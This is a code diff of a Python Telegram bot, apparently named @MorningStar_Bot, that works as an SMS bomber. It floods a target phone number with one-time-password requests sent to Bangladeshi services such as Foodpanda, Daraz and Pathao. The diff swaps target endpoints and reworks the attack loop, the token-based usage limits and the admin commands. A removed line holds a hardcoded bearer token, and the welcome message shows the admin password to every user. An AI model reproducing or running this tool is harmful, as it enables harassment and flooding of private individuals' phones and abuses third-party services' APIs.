-                    'authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlNob212b2JUZWNoQVBJVXNlciIsImlhdCI6MTY1OTg5NTcwOH0.IOdKen62ye0N9WljM_cj3Xffmjs3dXUqoJRZ_1ezd4Q',
                     'content-type': 'application/json',
-                    'origin': 'https://app.shomvob.co',
-                    'referer': 'https://app.shomvob.co/auth/',
+                    'origin': 'https://www.foodpanda.com.bd',
+                    'referer': 'https://www.foodpanda.com.bd/',
                     'user-agent': 'Mozilla/5.0'
                 }
-                data_shomvob = {
-                    "phone": f"880{clean_number}",
-                    "is_retry": 0
-                }
-                res = session.post(url_shomvob, json=data_shomvob, headers=headers_shomvob, timeout=5)
+                data_foodpanda = {"phone": f"+88{clean_number}"}
+                res = session.post(url_foodpanda, json=data_foodpanda, headers=headers_foodpanda, timeout=5)
                 if res.status_code in [200, 201, 202]:
                     cycle_success += 1
                     success += 1
-                    status_text = f"[Shomvob] ✓ {res.status_code}"
+                    status_text = f"[Foodpanda] ✓ {res.status_code}"
                 else:
                     cycle_failed += 1
                     failed += 1
-                    status_text = f"[Shomvob] ? {res.status_code}"
+                    status_text = f"[Foodpanda] ? {res.status_code}"
                 
                 requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                     'chat_id': chat_id,
@@ -1378,36 +1291,29 @@ def bombing_worker(chat_id, full_number, clean_number, raw_number, user_id, user
                 failed += 1
                 requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                     'chat_id': chat_id,
-                    'text': "[Shomvob] ✗ Failed"
+                    'text': "[Foodpanda] ✗ Failed"
                 })
             
-            # 32. Zatiq Easy
+            # 26. Daraz
             try:
-                url_zatiq = "https://easybill.zatiq.tech/api/auth/v1/send_otp"
-                headers_zatiq = {
+                url_daraz = "https://www.daraz.com.bd/api/login/otp"
+                headers_daraz = {
+                    'accept': 'application/json',
                     'content-type': 'application/json',
-                    'application-type': 'Merchant',
-                    'device-type': 'Web',
-                    'origin': 'https://merchant.zatiqeasy.com',
-                    'referer': 'https://merchant.zatiqeasy.com/',
-                    'user-agent': 'Mozilla/5.0',
-                    'accept': 'application/json'
+                    'origin': 'https://www.daraz.com.bd',
+                    'referer': 'https://www.daraz.com.bd/',
+                    'user-agent': 'Mozilla/5.0'
                 }
-                data_zatiq = {
-                    "code": "+880",
-                    "country_code": "BD",
-                    "phone": clean_number,
-                    "is_existing_user": False
-                }
-                res = session.post(url_zatiq, json=data_zatiq, headers=headers_zatiq, timeout=5)
+                data_daraz = {"phone": clean_number}
+                res = session.post(url_daraz, json=data_daraz, headers=headers_daraz, timeout=5)
                 if res.status_code in [200, 201, 202]:
                     cycle_success += 1
                     success += 1
-                    status_text = f"[Zatiq Easy] ✓ {res.status_code}"
+                    status_text = f"[Daraz] ✓ {res.status_code}"
                 else:
                     cycle_failed += 1
                     failed += 1
-                    status_text = f"[Zatiq Easy] ? {res.status_code}"
+                    status_text = f"[Daraz] ? {res.status_code}"
                 
                 requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                     'chat_id': chat_id,
@@ -1418,184 +1324,170 @@ def bombing_worker(chat_id, full_number, clean_number, raw_number, user_id, user
                 failed += 1
                 requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                     'chat_id': chat_id,
-                    'text': "[Zatiq Easy] ✗ Failed"
+                    'text': "[Daraz] ✗ Failed"
                 })
             
-            # Send cycle summary
+            # 27. Pathao
             try:
-                summary_text = f"📊 **CYCLE {cycle_num}/{MAX_CYCLES} SUMMARY**\n✓ Success: {cycle_success}\n✗ Failed: {cycle_failed}\n📈 Total: ✓{success} ✗{failed}"
+                url_pathao = "https://pathao.com/api/v2/login/otp"
+                headers_pathao = {
+                    'accept': 'application/json',
+                    'content-type': 'application/json',
+                    'origin': 'https://pathao.com',
+                    'referer': 'https://pathao.com/',
+                    'user-agent': 'Mozilla/5.0'
+                }
+                data_pathao = {"phone": f"+88{clean_number}"}
+                res = session.post(url_pathao, json=data_pathao, headers=headers_pathao, timeout=5)
+                if res.status_code in [200, 201, 202]:
+                    cycle_success += 1
+                    success += 1
+                    status_text = f"[Pathao] ✓ {res.status_code}"
+                else:
+                    cycle_failed += 1
+                    failed += 1
+                    status_text = f"[Pathao] ? {res.status_code}"
+                
                 requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                     'chat_id': chat_id,
-                    'text': summary_text,
-                    'parse_mode': 'Markdown',
-                    'reply_markup': json.dumps({'inline_keyboard': [[{'text': '🛑 STOP ATTACK', 'callback_data': f'stop_{user_id}'}]]})
+                    'text': status_text
                 })
             except:
-                pass
+                cycle_failed += 1
+                failed += 1
+                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
+                    'chat_id': chat_id,
+                    'text': "[Pathao] ✗ Failed"
+                })
             
-            # Wait 5 seconds between cycles
-            if cycle_num < MAX_CYCLES and not (user_id in active_attacks and active_attacks[user_id].get('stop', False)) and not server_is_shutting_down:
-                for i in range(5, 0, -1):
-                    if user_id in active_attacks and active_attacks[user_id].get('stop', False):
-                        break
-                    if server_is_shutting_down:
-                        break
-                    time.sleep(1)
-        
-        # Auto-stop complete message
-        if cycle_num >= MAX_CYCLES and user_id in active_attacks and not active_attacks[user_id].get('stop', False):
-            auto_stop_msg = (
-                f"⏱️ **AUTO-STOP COMPLETED**\n\n"
-                f"Attack finished after {MAX_CYCLES} cycles.\n"
-                f"Target: `{full_number}`\n"
-                f"Final Stats: ✓{success} | ✗{failed}\n\n"
-                f"Use /bomb to start a new attack."
-            )
+            # Cycle summary
             try:
                 requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                     'chat_id': chat_id,
-                    'text': auto_stop_msg,
+                    'text': f"✅ **CYCLE {cycle_num} COMPLETED**\nSuccess: {cycle_success} | Failed: {cycle_failed}",
                     'parse_mode': 'Markdown'
                 })
             except:
                 pass
-                
-    except Exception as e:
-        log_activity(f"Error in bombing thread for {username}: {e}")
-    finally:
+            time.sleep(2)
+
+        # Attack completed
         if user_id in active_attacks:
             del active_attacks[user_id]
-        log_activity(f"Attack {'auto-stopped' if cycle_num >= MAX_CYCLES else 'stopped'} by {username} - Cycles: {cycle_num}, Success: {success}, Failed: {failed}")
+        
+        try:
+            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
+                'chat_id': chat_id,
+                'text': f"🎉 **ALL CYCLES COMPLETED**\nTotal Success: {success} | Total Failed: {failed}",
+                'parse_mode': 'Markdown'
+            })
+        except:
+            pass
+        log_activity(f"Attack completed by {username} on {full_number}. Success: {success}, Failed: {failed}")
 
-# Admin functions
-async def admin_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Admin login command"""
-    if not context.args:
-        await update.message.reply_text("Usage: /admin <password>")
-        return
-    
-    password = context.args[0]
-    user_id = update.effective_user.id
-    
-    if password == ADMIN_PASS:
-        if user_id not in super_users:
-            super_users.append(user_id)
-            save_data()
-            await update.message.reply_text(
-                "✅ **ADMIN ACCESS GRANTED!**\n\n"
-                "You are now a SUPER USER!\n"
-                "You have unlimited attacks and admin privileges.\n\n"
-                "Commands:\n"
-                "/approve <user_id> - Approve super user request\n"
-                "/remove <user_id> - Remove super user\n"
-                "/listusers - List all super users\n"
-                "/broadcast <msg> - Send broadcast message\n"
-                "/stopall - Stop all active attacks",
-                parse_mode='Markdown'
-            )
-        else:
-            await update.message.reply_text("✅ You are already a SUPER USER!")
-    else:
-        await update.message.reply_text("❌ Invalid admin password!")
+    except Exception as e:
+        log_activity(f"Error in bombing worker: {e}")
+        if user_id in active_attacks:
+            del active_attacks[user_id]
 
-async def approve_superuser(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Approve super user request"""
-    user_id = update.effective_user.id
+# ==================== TELEGRAM COMMAND HANDLERS ====================
+def get_reply_keyboard(user_id):
+    """Get reply keyboard with commands based on user type"""
+    is_super = user_id in super_users
     
-    # Check if user is admin
-    if user_id not in super_users:
-        await update.message.reply_text("❌ You don't have permission to approve super users!")
-        return
+    # Base commands for all users
+    keyboard = [
+        ["/start", "/attack", "/mytokens"],
+        ["/apply", "/stop"]
+    ]
     
-    if not context.args:
-        await update.message.reply_text("Usage: /approve <user_id>")
-        return
+    # Add admin commands if super user
+    if is_super:
+        keyboard.append(["/logout", "/listusers"])
+        keyboard.append(["/grant", "/revoke"])
     
-    try:
-        target_id = int(context.args[0])
-        if target_id not in super_users:
-            super_users.append(target_id)
-            save_data()
-            
-            # Notify the user
-            try:
-                await context.bot.send_message(
-                    chat_id=target_id,
-                    text="🎉 **CONGRATULATIONS!** 🎉\n\nYou have been approved as a **SUPER USER**!\n\nYou now have unlimited attacks and special privileges.\n\nThank you for using @MorningStar_Bot!",
-                    parse_mode='Markdown'
-                )
-            except:
-                pass
-            
-            await update.message.reply_text(f"✅ User {target_id} has been approved as SUPER USER!")
-        else:
-            await update.message.reply_text(f"⚠️ User {target_id} is already a SUPER USER!")
-    except:
-        await update.message.reply_text("❌ Invalid user ID!")
+    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
 
-async def remove_superuser(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Remove super user"""
-    user_id = update.effective_user.id
-    
-    if user_id not in super_users:
-        await update.message.reply_text("❌ You don't have permission to remove super users!")
-        return
-    
-    if not context.args:
-        await update.message.reply_text("Usage: /remove <user_id>")
-        return
-    
-    try:
-        target_id = int(context.args[0])
-        if target_id in super_users:
-            super_users.remove(target_id)
-            save_data()
-            
-            # Notify the user
-            try:
-                await context.bot.send_message(
-                    chat_id=target_id,
-                    text="⚠️ **SUPER USER STATUS REMOVED** ⚠️\n\nYour super user privileges have been removed.\nYou are now a normal user with 3 attacks per day limit.\n\nIf you think this is a mistake, contact the administrator.",
-                    parse_mode='Markdown'
-                )
-            except:
-                pass
-            
-            await update.message.reply_text(f"✅ User {target_id} has been removed from SUPER USERS!")
-        else:
-            await update.message.reply_text(f"⚠️ User {target_id} is not a SUPER USER!")
-    except:
-        await update.message.reply_text("❌ Invalid user ID!")
-
-async def list_superusers(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """List all super users"""
-    user_id = update.effective_user.id
-    
-    if user_id not in super_users:
-        await update.message.reply_text("❌ You don't have permission to view this list!")
-        return
-    
-    if not super_users:
-        await update.message.reply_text("📋 No super users found.")
-        return
-    
-    user_list = "⭐ **SUPER USERS** ⭐\n\n"
-    for uid in super_users:
-        if str(uid) in bot_users:
-            user_data = bot_users[str(uid)]
-            user_list += f"• {user_data['first_name']} (@{user_data['username']})\n  ID: `{uid}`\n  Attacks: {user_data['total_attacks']}\n\n"
-        else:
-            user_list += f"• User ID: `{uid}`\n\n"
-    
-    await update.message.reply_text(user_list, parse_mode='Markdown')
-
-async def apply_superuser(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Apply for super user status"""
-    user_id = update.effective_user.id
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
+    track_user(user.id, user.username, user.first_name)
+    
+    is_super = user.id in super_users
+    user_id_str = str(user.id)
+    token_balance = user_tokens.get(user_id_str, {}).get("extra_tokens", 0)
+    free_left = user_tokens.get(user_id_str, {}).get("free_uses_left", 0)
+    
+    msg = f"👋 Welcome {user.first_name}!\n\n"
+    msg += f"🔥 **Developer: Mr MorningStar**\n\n"
+    msg += f"🎟️ **Your Status:**\n"
+    if is_super:
+        msg += "✅ Super User (Unlimited Access)\n"
+    else:
+        msg += f"One-time Free Uses Left: {free_left}/3\n"
+        msg += f"Extra Tokens: {token_balance}\n"
+    
+    msg += f"\n📋 **All Commands:**\n"
+    msg += f"/start - Show this message\n"
+    msg += f"/attack <phone> - Start bombing\n"
+    msg += f"/stop - Stop current attack\n"
+    msg += f"/mytokens - Check token balance\n"
+    msg += f"/apply <reason> - Request extra tokens\n"
+    if is_super:
+        msg += f"\n🔑 **Admin Commands:**\n"
+        msg += f"/logout - Logout from admin\n"
+        msg += f"/grant <user_id> <amount> - Add tokens\n"
+        msg += f"/revoke <user_id> <amount> - Remove tokens\n"
+    else:
+        msg += f"\n🔑 **Admin Login:**\n"
+        msg += f"/admin {ADMIN_PASS} - Login as admin\n"
+    
+    msg += f"\n💡 **Token Rules:**\n"
+    msg += f"- You get 3 one-time free uses (never resets)\n"
+    msg += f"- After free uses end, use extra tokens\n"
+    msg += f"- Tokens don't expire until used\n"
+    msg += f"- Need tokens? Contact @morningstarspice\n"
+    
+    reply_markup = get_reply_keyboard(user.id)
+    await update.message.reply_text(msg, parse_mode='Markdown', reply_markup=reply_markup)
+
+async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    args = context.args
+    
+    if len(args) != 1 or args[0] != ADMIN_PASS:
+        await update.message.reply_text("❌ Invalid admin password. Use /admin <password>")
+        return
+    
+    if user_id not in super_users:
+        super_users.append(user_id)
+        save_data()
+        await update.message.reply_text("✅ You are now logged in as Admin (Super User) with unlimited access.")
+        log_activity(f"Admin logged in: {user_id}")
+    else:
+        await update.message.reply_text("✅ You are already logged in as Admin.")
+
+async def logout_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
     
     if user_id in super_users:
-        await update.message.reply_text("✅ You are already a SUPER USER!")
+        super_users.remove(user_id)
+        save_data()
+        reply_markup = get_reply_keyboard(user_id)
+        await update.message.reply_text(
+            "✅ You have been logged out from Admin (Super User) privileges.",
+            reply_markup=reply_markup
+        )
+        log_activity(f"Admin logged out: {user_id}")
+    else:
+        await update.message.reply_text("❌ You are not logged in as Admin.")
+
+async def apply_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    user_id_str = str(user_id)
+    reason = " ".join(context.args) if context.args else "No reason provided"
+    
+    if not super_users:
+        await update.message.reply_text("❌ No admin online. Try again later.")
         return
     
     # Notify all admins
@@ -1603,491 +1495,311 @@ async def apply_superuser(update: Update, context: ContextTypes.DEFAULT_TYPE):
         try:
             await context.bot.send_message(
                 chat_id=admin_id,
-                text=f"📢 **SUPER USER REQUEST** 📢\n\n"
-                f"User: {user.first_name} (@{user.username})\n"
-                f"ID: `{user_id}`\n\n"
-                f"Use `/approve {user_id}` to approve this user as SUPER USER.",
-                parse_mode='Markdown'
+                text=f"📥 **Token Application**\nUser: {update.effective_user.first_name} (@{update.effective_user.username})\nID: {user_id}\nReason: {reason}\n\nUse /grant {user_id} <amount> to approve."
             )
         except:
             pass
     
-    await update.message.reply_text(
-        "📢 **REQUEST SENT!** 📢\n\n"
-        "Your request for SUPER USER status has been sent to the administrator.\n"
-        "You will be notified once approved.\n\n"
-        "Until then, you have 3 attacks per day limit.",
-        parse_mode='Markdown'
-    )
+    await update.message.reply_text("✅ Your token application has been sent to the admin. You will be notified when approved.")
 
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Send a message when the command /start is issued."""
-    user = update.effective_user
-    track_user(user.id, user.username, user.first_name)
-    
-    user_type = "⭐ SUPER USER ⭐" if user.id in super_users else "👤 NORMAL USER"
-    limit_text = "Unlimited attacks" if user.id in super_users else "3 attacks per day"
-    
-    welcome_message = (
-        f"👋 **Welcome {user.first_name}!**\n\n"
-        f"🔥 **SMS Bomber Bot**\n"
-        f"Developed by `Mr.MorningStar`\n\n"
-        f"**Your Status:** {user_type}\n"
-        f"**Limit:** {limit_text}\n\n"
-        f"**Server Status:** 🟢 ONLINE\n"
-        f"**Total Users:** {bot_stats['total_users']}\n"
-        f"**Total Attacks:** {bot_stats['total_attacks']}\n"
-        f"**Total Sites:** 32\n\n"
-        f"**Features:**\n"
-        f"• Auto-stop after 3 cycles\n"
-        f"• 32 Bangladeshi services\n"
-        f"• 5-second delay between cycles\n"
-        f"• Real-time status updates\n\n"
-        f"**Commands:**\n"
-        f"/bomb <number> - Start bombing\n"
-        f"/stop - Stop current attack\n"
-        f"/stats - View your stats\n"
-        f"/server - Check server status\n"
-        f"/apply - Apply for SUPER USER\n"
-        f"/help - Show help menu\n\n"
-        f"**Example:** `/bomb 01749XXXXXX`"
-    )
-    
-    keyboard = [
-        [InlineKeyboardButton("💣 START BOMBING", callback_data="bomb")],
-        [InlineKeyboardButton("📊 MY STATS", callback_data="mystats")],
-        [InlineKeyboardButton("🖥️ SERVER STATUS", callback_data="server")]
-    ]
-    
-    if user.id not in super_users:
-        keyboard.append([InlineKeyboardButton("⭐ APPLY FOR SUPER USER", callback_data="apply")])
-    
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    
-    await update.message.reply_text(welcome_message, reply_markup=reply_markup, parse_mode='Markdown')
-
-async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle /help command"""
+async def grant_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     
-    help_text = (
-        "🆘 **HELP MENU**\n\n"
-        "**Commands:**\n"
-        "• `/start` - Start the bot\n"
-        "• `/bomb <number>` - Start bombing (e.g., `/bomb 01749XXXXX`)\n"
-        "• `/stop` - Stop current attack\n"
-        "• `/stats` - View your usage statistics\n"
-        "• `/server` - Check server status\n"
-        "• `/apply` - Apply for SUPER USER status\n"
-        "• `/help` - Show this help menu\n\n"
-        "**How to use:**\n"
-        "1. Send `/bomb 01749XXXXX` or click START BOMBING button\n"
-        "2. Bot will send requests to 32 sites every 5 seconds\n"
-        "3. Attack auto-stops after 3 cycles\n"
-        "4. Use `/stop` to end earlier\n\n"
-        "**Limits:**\n"
-        "• Normal users: 3 attacks per day\n"
-        "• Super users: Unlimited attacks\n\n"
-        "**Developer:** `Mr.MorningStar`"
-    )
+    if user_id not in super_users:
+        await update.message.reply_text("❌ Admin only command.")
+        return
     
-    if user_id in super_users:
-        help_text += (
-            "\n\n**Admin Commands:**\n"
-            "• `/admin <password>` - Login as admin\n"
-            "• `/approve <user_id>` - Approve super user\n"
-            "• `/remove <user_id>` - Remove super user\n"
-            "• `/listusers` - List all super users\n"
-            "• `/broadcast <msg>` - Send broadcast message\n"
-            "• `/stopall` - Stop all active attacks"
-        )
+    args = context.args
+    if len(args) != 2:
+        await update.message.reply_text("Usage: /grant <user_id> <amount>")
+        return
     
-    await update.message.reply_text(help_text, parse_mode='Markdown')
-
-async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle button callbacks"""
-    query = update.callback_query
-    await query.answer()
-    user = update.effective_user
+    target_user_id = args[0]
+    try:
+        amount = int(args[1])
+        if amount <= 0:
+            raise ValueError
+    except:
+        await update.message.reply_text("Invalid amount. Must be a positive integer.")
+        return
     
-    if query.data == "bomb":
-        await query.edit_message_text("📱 **Enter target number:**\nExample: `01749XXXXX`", parse_mode='Markdown')
-        context.user_data['awaiting_number'] = True
+    # Initialize target user's token data if not exists
+    if target_user_id not in user_tokens:
+        user_tokens[target_user_id] = {
+            "extra_tokens": 0,
+            "daily_free_used": 0,
+            "last_daily_reset": datetime.now().strftime("%Y-%m-%d")
+        }
     
-    elif query.data == "apply":
-        await apply_superuser(update, context)
-        await query.delete_message()
+    user_tokens[target_user_id]["extra_tokens"] += amount
+    save_data()
     
-    elif query.data == "mystats":
-        user_id_str = str(user.id)
-        if user_id_str in bot_users:
-            data = bot_users[user_id_str]
-            super_status = "⭐ SUPER USER" if user.id in super_users else "👤 NORMAL USER"
-            remaining = ""
-            if user.id not in super_users:
-                used = data.get('daily_attacks', 0)
-                remaining = f"\n📊 Today's Attacks: {used}/3\n"
-            
-            stats_text = (
-                f"📊 **YOUR STATS**\n\n"
-                f"👤 Username: @{data['username'] or 'None'}\n"
-                f"📝 Name: {data['first_name']}\n"
-                f"⭐ Status: {super_status}\n"
-                f"🕐 First Seen: {data['first_seen']}\n"
-                f"🕒 Last Seen: {data['last_seen']}\n"
-                f"💣 Total Attacks: {data['total_attacks']}\n"
-                f"💬 Total Messages: {data['total_messages']}"
-                f"{remaining}"
-            )
-            await query.edit_message_text(stats_text, parse_mode='Markdown')
-        else:
-            await query.edit_message_text("❌ No stats found!", parse_mode='Markdown')
-    
-    elif query.data == "server":
-        uptime = datetime.now() - datetime.strptime(bot_stats['start_time'], "%Y-%m-%d %H:%M:%S")
-        hours = uptime.total_seconds() // 3600
-        minutes = (uptime.total_seconds() % 3600) // 60
-        
-        server_text = (
-            f"🖥️ **SERVER STATUS**\n\n"
-            f"Status: 🟢 **ONLINE**\n"
-            f"Started: {bot_stats['start_time']}\n"
-            f"Uptime: {int(hours)}h {int(minutes)}m\n"
-            f"👥 Total Users: {bot_stats['total_users']}\n"
-            f"💣 Total Attacks: {bot_stats['total_attacks']}\n"
-            f"⭐ Super Users: {len(super_users)}\n"
-            f"🌐 Total Sites: 32\n"
-            f"⚡ Auto-stop: 3 cycles\n"
-            f"👨‍💻 Developer: `Mr.MorningStar`"
-        )
-        await query.edit_message_text(server_text, parse_mode='Markdown')
-    
-    elif query.data.startswith("stop_"):
-        attack_user_id = int(query.data.split("_")[1])
-        if attack_user_id in active_attacks:
-            active_attacks[attack_user_id]['stop'] = True
-            await query.edit_message_text("🛑 Attack stopped successfully!")
-        else:
-            await query.edit_message_text("❌ No active attack found!")
-
-async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle regular messages"""
-    user = update.effective_user
-    track_user(user.id, user.username, user.first_name)
-    
-    if context.user_data.get('awaiting_number'):
-        raw_number = update.message.text.strip()
-        context.user_data['awaiting_number'] = False
-        
-        # Format number
-        full_number, clean_number = format_phone_number(raw_number)
-        
-        if not full_number or not clean_number:
-            await update.message.reply_text("❌ Invalid phone number format! Use: 017XXXXXXXX")
-            return
-            
-        user_id = user.id
-        chat_id = update.effective_chat.id
-        
-        # Check if already bombing
-        if user_id in active_attacks:
-            await update.message.reply_text("⚠️ You already have an active attack! Use /stop first.", parse_mode='Markdown')
-            return
-        
-        # Check attack limits
-        if not can_attack(user_id):
-            await update.message.reply_text(
-                "❌ **LIMIT REACHED!**\n\n"
-                "You have used all 3 attacks for today.\n"
-                "Please try again tomorrow.\n\n"
-                "Want unlimited attacks? Use `/apply` to request SUPER USER status!",
-                parse_mode='Markdown'
-            )
-            return
-        
-        # Increment attack counter
-        increment_attack_count(user_id)
-        
-        # Store attack info
-        active_attacks[user_id] = {'stop': False}
-        
-        # Send start message with stop button
-        stop_keyboard = [[InlineKeyboardButton("🛑 STOP ATTACK", callback_data=f"stop_{user_id}")]]
-        reply_markup = InlineKeyboardMarkup(stop_keyboard)
-        
-        limit_info = "Unlimited attacks (SUPER USER)" if user_id in super_users else f"Remaining today: {3 - bot_users[str(user_id)].get('daily_attacks', 0)}/3"
-        
-        await update.message.reply_text(
-            f"💣 **ATTACK STARTED!**\n\n"
-            f"Target: `{full_number}`\n"
-            f"Total Sites: 32\n"
-            f"Auto-stop after 3 cycles\n"
-            f"Waiting 5 seconds between cycles...\n\n"
-            f"📊 {limit_info}\n\n"
-            f"Click the STOP button below to end early.",
-            reply_markup=reply_markup,
+    # Notify target user with clear message
+    try:
+        await context.bot.send_message(
+            chat_id=int(target_user_id),
+            text=f"🎉 **TOKEN GRANTED!**\n\nYou just received **{amount} extra tokens** from admin!\n\nYour new token balance: **{user_tokens[target_user_id]['extra_tokens']}**\n\nUse /attack to start bombing!",
             parse_mode='Markdown'
         )
-        
-        # Start bombing in thread
-        thread = threading.Thread(
-            target=bombing_worker,
-            args=(chat_id, full_number, clean_number, raw_number, user_id, user.username or user.first_name)
-        )
-        thread.daemon = True
-        thread.start()
+    except:
+        pass
     
-    else:
-        await update.message.reply_text("Use /start to begin or /bomb <number> to start")
+    await update.message.reply_text(f"✅ Granted {amount} tokens to user {target_user_id}. New balance: {user_tokens[target_user_id]['extra_tokens']}")
 
-async def bomb_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle /bomb command"""
-    if not context.args:
-        await update.message.reply_text("Usage: /bomb <phone_number>\nExample: /bomb 01749XXXXX")
+async def revoke_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    
+    if user_id not in super_users:
+        await update.message.reply_text("❌ Admin only command.")
         return
     
+    args = context.args
+    if len(args) != 2:
+        await update.message.reply_text("Usage: /revoke <user_id> <amount>")
+        return
+    
+    target_user_id = args[0]
+    try:
+        amount = int(args[1])
+        if amount <= 0:
+            raise ValueError
+    except:
+        await update.message.reply_text("Invalid amount. Must be a positive integer.")
+        return
+    
+    if target_user_id not in user_tokens:
+        await update.message.reply_text("User has no token data.")
+        return
+    
+    user_tokens[target_user_id]["extra_tokens"] = max(0, user_tokens[target_user_id]["extra_tokens"] - amount)
+    save_data()
+    
+    # Notify target user
+    try:
+        await context.bot.send_message(
+            chat_id=int(target_user_id),
+            text=f"⚠️ Admin revoked {amount} tokens from your balance. New balance: {user_tokens[target_user_id]['extra_tokens']}"
+        )
+    except:
+        pass
+    
+    await update.message.reply_text(f"✅ Revoked {amount} tokens from user {target_user_id}. New balance: {user_tokens[target_user_id]['extra_tokens']}")
+
+async def mytokens_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    user_id_str = str(user_id)
+    
+    if user_id_str not in user_tokens:
+        user_tokens[user_id_str] = {
+            "extra_tokens": 0,
+            "free_uses_left": 3
+        }
+        save_data()
+    
+    user_token = user_tokens[user_id_str]
+    free_left = user_token.get("free_uses_left", 0)
+    extra_tokens = user_token.get("extra_tokens", 0)
+    is_super = user_id in super_users
+    
+    msg = f"🎟️ **Your Token Status**\n"
+    if is_super:
+        msg += "✅ Super User (Unlimited Access)\n"
+    else:
+        msg += f"One-time Free Uses Left: {free_left}/3\n"
+        msg += f"Extra Tokens: {extra_tokens}\n"
+        msg += f"Total Remaining Uses: {free_left + extra_tokens}\n"
+        if free_left + extra_tokens == 0:
+            msg += f"\n💡 Need tokens? Contact @morningstarspice"
+    
+    await update.message.reply_text(msg, parse_mode='Markdown')
+
+async def listusers_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    
+    if user_id not in super_users:
+        await update.message.reply_text("❌ Admin only command.")
+        return
+    
+    if not bot_users:
+        await update.message.reply_text("📋 No users found.")
+        return
+    
+    msg = f"📋 **USER LIST (Admin View)**\n\n"
+    msg += f"Total Users: {len(bot_users)}\n"
+    msg += f"Super Users: {len(super_users)}\n\n"
+    
+    for uid, data in bot_users.items():
+        is_super = "⭐" if int(uid) in super_users else "👤"
+        token_info = user_tokens.get(uid, {})
+        free_left = token_info.get("free_uses_left", 0)
+        extra_tokens = token_info.get("extra_tokens", 0)
+        total_uses = free_left + extra_tokens
+        
+        msg += f"{is_super} **{data.get('first_name', 'Unknown')}**\n"
+        msg += f"   ID: `{uid}`\n"
+        msg += f"   Username: @{data.get('username', 'N/A')}\n"
+        msg += f"   Free Left: {free_left}/3 | Extra: {extra_tokens} | Total: {total_uses}\n"
+        msg += f"   Attacks: {data.get('total_attacks', 0)}\n\n"
+    
+    await update.message.reply_text(msg, parse_mode='Markdown')
+
+async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
-    raw_number = context.args[0]
-    
-    # Format number
-    full_number, clean_number = format_phone_number(raw_number)
-    
-    if not full_number or not clean_number:
-        await update.message.reply_text("❌ Invalid phone number format! Use: 017XXXXXXXX")
-        return
-    
     user_id = user.id
     chat_id = update.effective_chat.id
     
-    # Check if already bombing
+    # Check if attack already running
     if user_id in active_attacks:
-        await update.message.reply_text("⚠️ You already have an active attack! Use /stop first.", parse_mode='Markdown')
+        await update.message.reply_text("❌ You already have an active attack. Use /stop to stop it.")
         return
     
-    # Check attack limits
-    if not can_attack(user_id):
-        await update.message.reply_text(
-            "❌ **LIMIT REACHED!**\n\n"
-            "You have used all 3 attacks for today.\n"
-            "Please try again tomorrow.\n\n"
-            "Want unlimited attacks? Use `/apply` to request SUPER USER status!",
-            parse_mode='Markdown'
-        )
+    # Check arguments
+    if len(context.args) != 1:
+        await update.message.reply_text("Usage: /attack <phone_number>\nExample: /attack 01712345678")
         return
     
-    # Increment attack counter
+    phone_number = context.args[0]
+    full_number, clean_number = format_phone_number(phone_number)
+    raw_number = clean_number
+    
+    # Check if user can attack
+    can_attack_result, message = can_attack(user_id)
+    if not can_attack_result:
+        await update.message.reply_text(f"❌ {message}")
+        return
+    
+    # Start attack
+    active_attacks[user_id] = {'stop': False, 'chat_id': chat_id}
     increment_attack_count(user_id)
     
-    # Store attack info
-    active_attacks[user_id] = {'stop': False}
+    await update.message.reply_text(f"🚀 **Attack started on {full_number}**\n{message}", parse_mode='Markdown')
     
-    # Send start message with stop button
-    stop_keyboard = [[InlineKeyboardButton("🛑 STOP ATTACK", callback_data=f"stop_{user_id}")]]
-    reply_markup = InlineKeyboardMarkup(stop_keyboard)
-    
-    limit_info = "Unlimited attacks (SUPER USER)" if user_id in super_users else f"Remaining today: {3 - bot_users[str(user_id)].get('daily_attacks', 0)}/3"
-    
+    # Start bombing worker in thread
+    threading.Thread(
+        target=bombing_worker,
+        args=(chat_id, full_number, clean_number, raw_number, user_id, user.username or user.first_name),
+        daemon=True
+    ).start()
+
+async def bomb_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
-        f"💣 **ATTACK STARTED!**\n\n"
-        f"Target: `{full_number}`\n"
-        f"Total Sites: 32\n"
-        f"Auto-stop after 3 cycles\n"
-        f"Waiting 5 seconds between cycles...\n\n"
-        f"📊 {limit_info}\n\n"
-        f"Click the STOP button below to end early.",
-        reply_markup=reply_markup,
+        "⚠️ **Old command detected!**\n\n"
+        "Use `/attack <phone>` instead of `/bomb`\n"
